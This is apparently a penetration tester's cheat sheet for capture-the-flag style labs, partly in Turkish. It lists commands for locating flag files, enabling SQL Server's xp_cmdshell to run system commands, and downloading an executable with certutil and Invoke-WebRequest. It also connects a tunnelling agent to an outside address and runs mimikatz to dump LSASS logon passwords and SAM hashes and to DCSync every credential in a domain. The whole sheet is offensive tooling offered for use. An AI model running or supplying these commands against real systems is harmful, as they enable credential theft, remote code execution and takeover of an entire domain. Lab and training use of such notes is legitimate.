# Flag Finderz

- find / "local.txt" 2>/dev/null | grep "local.txt"
- find / "proof.txt" 2>/dev/null | grep "proof.txt"
- dir C:\ /s /b | findstr "local.txt"
- dir C:\ /s /b | findstr "proof.txt"


# xpcmdshell

-- SQL Server'da xp_cmdshell özelliğini aktif etmek

- EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
- EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- xp_cmdshell ile whoami komutunu çalıştırmak
- EXEC xp_cmdshell 'whoami';


# Python Web Server

- python3 -m http.server 8000

# Python Virtual Environment

- python3 -m venv myenv
- source myenv/bin/activate
- pip install -r requirements.txt

# BloodHound All Datas

- MATCH (n)-[r]->(m)
- RETURN n, r, m

certutil -urlcache -split -f "http://example.com/file.exe" file.exe

Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "file.exe"

./agent -connect 10.10.15.7:9001 -ignore-cert

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"


mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:example.com /all /csv" "exit"



